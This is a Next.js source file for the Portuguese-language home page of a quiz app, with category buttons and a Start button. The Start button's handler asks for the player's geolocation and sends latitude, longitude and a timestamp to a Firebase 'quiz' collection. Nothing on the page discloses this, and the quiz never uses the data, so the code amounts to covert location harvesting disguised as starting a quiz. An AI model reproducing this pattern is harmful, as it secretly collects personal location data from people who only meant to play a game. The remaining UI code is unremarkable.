'use client'

import Template from "@/components/template/Template";
import { listaDeCategorias } from "@/core/constants/listaDeCategorias";
import { database, push, ref } from "@/lib/firebase";
import Image from "next/image";
import Link from "next/link";
import { useState } from "react";
import { FaPlay } from "react-icons/fa";

interface Coordinates {
    lat: number;
    lng: number;
}
export default function Home() {
	const [categoriaSelecionada, setCategoriaSelecionada] = useState<string | null>(null);
	const [desabilitado, setDesabilitado] = useState(true);
    const [, setLocation] = useState<Coordinates | null>(null);


	 // Função para capturar a localização do usuário
	 const getLocation = (event: React.MouseEvent<HTMLButtonElement>) => {
        event.preventDefault();

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const newLocation = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        timestamp: new Date().toISOString(),
                    };

                    setLocation(newLocation);

                    // Enviar os dados para o Firebase
                    const locationsRef = ref(database, "quiz");
                    push(locationsRef, {
                        latitude: newLocation.lat,
                        longitude: newLocation.lng,
                        timestamp: newLocation.timestamp,
                    })
                },
            )
        }
    }

	return (
		<Template>
			<div className="min-h-[80vh] flex flex-col justify-center items-center gap-6">
				<Image alt="Logo" src="/quiz.png" width={300} height={200} />
				<div className="flex flex-col gap-3 justify-items-center items-center">
					<h2 className="text-xl font-black md:text-2xl" style={{ textShadow: '1px 1px 2px black' }}>
						Selecione uma das categorias:
					</h2>
					<ul className="flex flex-col gap-2 md:grid md:grid-cols-2 md:gap-x-4">
						{listaDeCategorias.map((categoria) => (
							<li key={categoria.id}>
								<button
									className={`px-2 w-full text-lg font-bold py-1 rounded-lg transition-all ${categoriaSelecionada === categoria.id ? 'scale-[1.05]' : ''}`}
									style={{ textShadow: '1px 1px 2px black', boxShadow: '0 0 1px 2px black', backgroundColor: `${categoriaSelecionada === categoria.id ? 'var(--azul)' : 'var(--preto)'}` }}
									onClick={() => {
										setCategoriaSelecionada(categoria.id)
										setDesabilitado(false)
									}}
								>
									{categoria.nome}
								</button>
							</li>
						))}
					</ul>
				</div>
				<button
					className="bg-[--preto] py-2 rounded-lg w-full max-w-[200px]"
					style={{ boxShadow: '0 0 3px 2px black' }}
					disabled={desabilitado}
					onClick={getLocation}
				>
					<Link
						href={desabilitado ? '' : `/questionario?categoria=${categoriaSelecionada}`}
						className="fonteEspecial text-3xl flex justify-center items-center gap-3"
						style={{ textShadow: '1px 1px 2px black' }}
					>
						Start <FaPlay className="text-2xl" />
					</Link>

				</button>
			</div>
		</Template>
	);
}
